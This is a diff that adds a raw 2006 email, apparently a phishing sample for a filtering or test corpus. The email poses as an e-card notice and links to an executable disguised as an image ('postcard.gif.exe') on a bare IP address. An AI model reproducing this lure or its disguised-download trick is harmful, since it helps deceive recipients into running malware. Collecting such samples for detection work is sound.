@@ -1,0 +1,39 @@
+From nobody Sun Jan 25 13:49:58 2015
+Return-Path: <tomcat@ns2.ypok.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 00EF2469F2
+ for <user@login.example.com>; Mon, 14 Aug 2006 19:45:27 -0400 (EDT)
+Received: from ns2.ypok.com (ns2.ypok.com [213.218.132.228])
+ by mail.example.org (Postfix) with ESMTP id B70566CD0AC
+ for <user@example.com>; Mon, 14 Aug 2006 19:45:27 -0400 (EDT)
+Received: by ns2.ypok.com (Postfix, from userid 1018)
+ id C687E738A7F; Tue, 15 Aug 2006 00:48:47 +0200 (CEST)
+To: user@example.com
+Subject: You have received a postcard !
+From: postcard.com <postcard@postcard.com>
+Content-Type: text/html
+Message-Id: <20060814224847.C687E738A7F@ns2.ypok.com>
+Date: Tue, 15 Aug 2006 00:48:47 +0200 (CEST)
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 44
+
+
+v>
+<strong>Hello friend !</strong><br>
+You have just received a postcard from someone who cares about you!<br><br>
+<strong>This is a part of the message:</strong><br>
+&quot;Hy there! It has been a long time since I haven't heared about you!<br>
+I've just found out about this service from Claire, a friend of mine who also told me that...&quot;<br>
+<strong>If you'd like to see the rest of the message click <a 
+href="http://129.2.18.131/~sag/postcard.gif.exe">here</a> to receive your 
+animated postcard! </strong><br><br>
+
+<strong>===================</strong><br>
+Thank you for using <span class="style1">www.yourpostcard.com</span> 's services !!!<br>
+Please take this opportunity to let your friends hear about us by sending them a postcard from our collection !<br>
+<strong>==================</strong>
+</div>
